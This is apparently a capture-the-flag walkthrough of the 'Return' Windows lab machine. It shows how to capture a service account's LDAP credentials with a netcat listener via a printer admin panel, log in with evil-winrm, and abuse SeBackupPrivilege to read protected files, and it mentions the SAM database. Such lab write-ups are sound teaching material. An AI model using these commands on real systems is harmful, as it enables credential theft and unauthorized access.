Return is an easy Windows machine. It has a lot of ports open which might be overwhelming at first but if you enumerate carefully you can quickly discard ports until you only have one clear route to get the foothold. After getting credentials for the **svc-printer** user we can use the **SeBackupPrivilege** this user has to read any file in the system without administrator level permissions.

## Footprinting

Running an nmap scan on the target shows that this is an active directory machine and it is the domain controller machine. I assume this because I see that port 88 is open which is used by the KDC to grant TGT's. As usual with Windows machines we have SMB left open and we can try signing in with null credentials. It is also worth noting that the server has a webpage in port 80 which we will investigate later on. The other two interesting ports are 389 and 47001 which are LDAP and WinRM respectively.

#### SMB

I always try to enumerate as much as I can with SMB since it can be a quick win and we can get interesting files. Since we do not have credentials we can try logging in with a null session. 

```
smbclient -N -L 10.10.11.108
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We see that it allows us to login but it does not list any shares. I tried again with the default guest account some Windows machines have enabled with the credentials `Guest:` but the account was disabled. I also tried to use `rpcclient` to try to enumerate the system further but this time the null session did not let me in. At this point I could not proceed with SMB and I focus my attention somewhere else. I tend to leave potentials SMB exploits after I have enumerated everything and discarded other potential entry points.

#### Webpage

The page is a printer admin panel, the only page that has useful information is the settings page. I see that it has some data already filled in. It would have been pretty easy if the password was already filled in but the `*****` is just a placeholder. From this already filled out form we get a username `svc-printer` the form seems to be making a request to `printer.return.local` which is a subdomain of the host. 
![return](assets/images/return/Pasted image 20250302193758.png)

Using `burpsuite` I intercept the request to examine its contents. I was expecting to see a password change request but it is a simple POST request to `settings.php` with the following field:  `ip=printer.return.local`. The first thing I did was set up a listener on my box to see if I get any sort of connection back from the server. `nc -lvnp 389` I click update and we get a connection with the following data.

```
listening on [any] 389 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.108] 58395
0*`%return\svc-printerï¿½
                       1edFg43012!!

```

#### Enumerating Users and Groups

We clearly see the credentials that were hidden on the webpage. We can try enumerating the system now with `netexec` and the credentials `svc-printer:1edFg43012!!`. Using the `--users` flag we can enumerate the users in the box.

```
netexec  smb 10.10.11.108 -u svc-printer -p '1edFg43012!!' --users
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.10.11.108    445    PRINTER          -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.108    445    PRINTER          Administrator                 2021-07-16 15:03:22 0       Built-in account for administering the computer/domain 
SMB         10.10.11.108    445    PRINTER          Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.108    445    PRINTER          krbtgt                        2021-05-20 13:26:54 0       Key Distribution Center Service Account 
SMB         10.10.11.108    445    PRINTER          svc-printer                   2021-05-26 08:15:13 0       Service Account for Printer 
SMB         10.10.11.108    445    PRINTER          [*] Enumerated 4 local users: RETURN
```

We see that there are only four Users three of which are defaults in Active Directory machines. If there were more users I would try enumerating further maybe running bloodhound and enumerating potentially intersting groups or ACLs but since this is an easy machine and we already have the credentaisl for the only user on the box we can now login into the machine using `evil-winrm` with the credentials of the user. 

```
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

## Privilege Escalation

After getting the initial foothold as the `svc-printer` user I try to enumerate what privileges this user has with the command: `whoami /priv` and we get the following list.

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

I spot that this user has the `SeBackUpPrivilege` enabled. There is a very easy way to use this privilege to read any file in the system. I used this [exploit](https://github.com/giuliano108/SeBackupPrivilege) and using `evil-winrrm's` upload functionality I transfer the two dll files we need to exploit this privilege. We now have all the tools necessary to perform this exploit, we just need to import both modules. 

```
*Evil-WinRM* PS C:\Users\svc-printer\desktop> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc-printer\desktop> import-module .\SeBackupPrivilegeUtils.dll
```

Using the following command we can now transfer any file to our current directory and read it. In this case I simply copied the root flag but in a real scenario we would have copied the SAM database or any other file that would contain sensitive information from which we would further attack the system.

```
Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\root.txt' .\root.txt
```
